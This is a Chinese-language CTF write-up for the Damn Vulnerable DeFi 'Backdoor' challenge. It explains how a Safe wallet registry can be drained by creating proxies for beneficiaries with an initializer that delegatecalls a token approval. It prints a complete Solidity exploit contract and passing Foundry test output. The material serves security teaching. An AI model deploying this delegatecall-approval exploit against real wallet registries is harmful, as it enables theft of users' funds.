## 题目 [Backdoor](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/backdoor)

团队中有人部署了一个 Safe 钱包注册表，以激励团队成员创建更安全的钱包。当团队中的某人部署并注册一个钱包时，他们可以获得 10 个 DVT 代币。  

该注册表与合法的 Safe Proxy 工厂紧密集成，并且包含严格的安全检查。  

目前有四个人注册为受益人：Alice、Bob、Charlie 和 David。注册表中有 40 个 DVT 代币余额，待分配给他们。  

你的任务是揭示该注册表中的漏洞，救出所有资金，并将其存入指定的恢复账户。需要在一次交易中完成。  

要求：
1. 在一笔交易中完成。
2. 四个收益人都注册了一个钱包。
3. 四个地址不再是收益人。
4. 恢复地址有 40 个 DVT。

## 题解
利用 Gnosis Safe 的代理合约在创建过程中的漏洞，从而授权 DVT 代币的转出。  
对每个受益人（4人）构造 Safe 初始化数据 _initializer，该数据包含：
- 受益人作为 Safe 合约的所有者。
- 交易确认阈值为 1，即只需要一个签名。
- 调用攻击合约的 delegateApprove 函数，从而授权代币转出。

POC:
``` solidity
contract BackdoorExploit {
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable dvt;
    address recovery;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _registry,
        address _token,
        address _recovery
    ) {
        singletonCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _registry;
        dvt = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        // For every registered user we'll create a wallet
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Create the data that will be passed to the proxyCreated function on WalletRegistry
            // The parameters correspond to the GnosisSafe::setup() contract
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  List of Safe owners.
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature(
                    "delegateApprove(address)",
                    address(this)
                ), // data =>  Data payload for optional delegate call.
                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                0, // payment => Value that should be paid
                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
            );

            // Create new proxies on behalf of other users
            SafeProxy _newProxy = SafeProxyFactory(walletFactory)
                .createProxyWithCallback(
                    singletonCopy, // _singleton => Address of singleton contract.
                    _initializer, // initializer => Payload for message call sent to new proxy contract.
                    i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                    IProxyCreationCallback(walletRegistry) // callback => Cast walletRegistry to IProxyCreationCallback
                );
            //Transfer to caller
            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
        }
    }
}
```
运行测试：
```
forge test --mp test/backdoor/Backdoor.t.sol
```
测试结果：
```
Ran 2 tests for test/backdoor/Backdoor.t.sol:BackdoorChallenge
[PASS] test_assertInitialState() (gas: 56132)
[PASS] test_backdoor() (gas: 1736055)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.91ms (2.40ms CPU time)
```